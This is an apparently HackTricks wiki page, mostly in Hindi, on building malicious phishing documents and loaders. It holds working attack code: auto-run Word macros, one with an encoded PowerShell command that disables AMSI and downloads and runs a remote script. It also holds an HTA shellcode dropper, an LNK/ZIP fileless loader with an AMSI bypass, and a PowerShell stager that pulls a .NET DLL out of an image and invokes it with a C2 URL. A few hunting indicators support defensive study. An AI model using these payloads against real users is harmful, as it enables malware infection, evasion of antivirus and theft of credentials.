# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा वैलिडेशन करता है। डेटा वैलिडेशन डेटा संरचना की पहचान के रूप में, OfficeOpenXML standard के خلاف किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).

You can use the following command to check which extensions are going to be executed by some Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### बाहरी इमेज लोड

जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, और **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Document से arbitrary code चलाने के लिए macros का उपयोग करना संभव है।

#### Autoload functions

जितने अधिक सामान्य वे होंगे, उतनी ही अधिक संभावना है कि AV उन्हें डिटेक्ट कर लेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### मैन्युअली मेटाडेटा हटाएँ

जाएँ **File > Info > Inspect Document > Inspect Document**, जो Document Inspector को खोलेगा। क्लिक करें **Inspect** और फिर **Remove All** पर क्लिक करें जो **Document Properties and Personal Information** के बगल में है।

#### Doc Extension

जब समाप्त हो जाए, **Save as type** ड्रॉपडाउन चुनें, फ़ॉर्मेट को **`.docx`** से **Word 97-2003 `.doc`** में बदलें।\
ऐसा इसलिए करें क्योंकि आप **`.docx` के अंदर macro's नहीं सहेज सकते** और macro-enabled **`.docm`** एक्सटेंशन के बारे में एक **stigma** है (उदा. थम्बनेल आइकन पर बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे उन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए, यह **legacy `.doc` extension सबसे अच्छा समझौता** है।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. यह user interface बनाता है और ब्राउज़र की सुरक्षा मॉडल की सीमाओं के बिना "fully trusted" application के रूप में execute होता है।

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण को मजबूर करना

NTLM प्रमाणीकरण को **"रिमोटली"** मजबूर करने के कई तरीके हैं — उदाहरण के लिए, आप ईमेल या HTML में ऐसे **invisible images** जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (यहाँ तक कि HTTP MitM?)। या पीड़ित को उन फ़ाइलों का **address** भेजें जो फोल्डर खोलने पर ही एक **authentication** को **trigger** कर दें।

**इन विचारों और अन्य चीजों को निम्न पृष्ठों में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

याद रखें कि आप केवल hash या authentication चोरी ही नहीं कर सकते, बल्कि **NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

अत्यंत प्रभावी अभियानों में एक ZIP दिया जाता है जिसमें दो मान्य decoy दस्तावेज़ (PDF/DOCX) और एक malicious .lnk शामिल होता है। चाल यह है कि वास्तविक PowerShell loader ZIP के raw bytes में एक unique marker के बाद स्टोर होता है, और .lnk उसे carve करके पूरी तरह memory में चलाता है।

निम्नलिखित सामान्य प्रवाह .lnk PowerShell one-liner द्वारा लागू किया जाता है:

1) मूल ZIP को सामान्य पथों में खोजें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और वर्तमान working directory के parent में।  
2) ZIP bytes पढ़ें और एक hardcoded marker खोजें (उदा., xFIQCV)। Marker के बाद जो कुछ भी है वह embedded PowerShell payload है।  
3) ZIP को %ProgramData% में कॉपी करें, वहाँ extract करें, और वैध दिखने के लिए decoy .docx खोलें।  
4) current process के लिए AMSI को बायपास करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) अगले चरण को deobfuscate करें (उदा., सभी # कैरेक्टर्स हटाएँ) और इसे memory में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery अक्सर reputable PaaS subdomains (e.g., *.herokuapp.com) का दुरुपयोग करती है और payloads को gate कर सकती है (IP/UA के आधार पर benign ZIPs सर्व करना).
- अगला चरण अक्सर base64/XOR shellcode को decrypt करता है और Reflection.Emit + VirtualAlloc के माध्यम से execute करता है ताकि disk artifacts मिनिमाइज़ हों.

Persistence used in the same chain
- Microsoft Web Browser control के COM TypeLib hijacking ताकि IE/Explorer या कोई भी इसे embed करने वाला app payload को स्वचालित रूप से पुनः लॉन्च कर दे। विवरण और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- उन ZIP files जिनमें ASCII marker string (उदा., xFIQCV) archive data के अंत में appended हो।
- .lnk जो parent/user फोल्डर्स enumerate करता है ताकि ZIP locate कर सके और एक decoy document खोलता है।
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads जो trusted PaaS domains के अंतर्गत होस्ट किए गए links के साथ समाप्त होते हैं।

## Steganography-delimited payloads in images (PowerShell stager)

हाल की loader chains obfuscated JavaScript/VBS deliver करती हैं जो embedded Base64 को decode करके एक Base64 PowerShell stager चलाती हैं। वह stager एक image (अक्सर GIF) डाउनलोड करती है जिसमें एक Base64-encoded .NET DLL unique start/end markers के बीच plain text के रूप में छिपा होता है। स्क्रिप्ट इन delimiters (जंगल में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>») को खोजती है, बीच का टेक्स्ट extract करती है, उसे Base64-decode करके bytes बनाती है, assembly को इन-मेमोरी load करती है और C2 URL के साथ एक ज्ञात entry method को invoke करती है।

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → PowerShell stager को -nop -w hidden -ep bypass के साथ लॉन्च करता है।
- Stage 2: PowerShell stager → image डाउनलोड करता है, marker-delimited Base64 को carve करता है, .NET DLL को इन-मेमोरी load करता है और उसके method (उदा., VAI) को C2 URL और options पास करते हुए कॉल करता है।
- Stage 3: Loader final payload प्राप्त करता है और आम तौर पर process hollowing के माध्यम से इसे एक trusted binary (आमतौर पर MSBuild.exe) में inject करता है। process hollowing और trusted utility proxy execution के बारे में और पढ़ें यहाँ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell का उदाहरण जो एक image से DLL निकालकर इन-मेमोरी .NET method को invoke करता है:

<details>
<summary>PowerShell stego payload extractor और loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass और string deobfuscation सामान्यतः assembly लोड करने से पहले लागू होते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए स्कैन करें; ऐसे PowerShell प्रोसेस की पहचान करें जो images तक पहुँचकर तुरंत Base64 blobs डिकोड कर रहे हों।

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार मिलने वाला प्रारम्भिक चरण एक छोटा, heavily‑obfuscated `.js` या `.vbs` होता है जो किसी archive के अंदर डिलिवर किया जाता है। इसका एकमात्र उद्देश्य एक embedded Base64 string को decode करना और PowerShell को `-nop -w hidden -ep bypass` के साथ लॉन्च करके अगले चरण को HTTPS पर bootstrap करना होता है।

बुनियादी तर्क (abstract):
- अपनी फ़ाइल की सामग्री पढ़ें
- junk strings के बीच में मौजूद Base64 blob का पता लगाएँ
- इसे ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` के माध्यम से `powershell.exe` को invoke करके Execute करें

हंटिंग संकेत
- Archived JS/VBS attachments जो command line में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn कर रहे हों।
- `wscript.exe` जो user temp paths से `powershell.exe -nop -w hidden` लॉन्च कर रहा हो।

## Windows files to steal NTLM hashes

इस पेज को देखें: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## संदर्भ

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
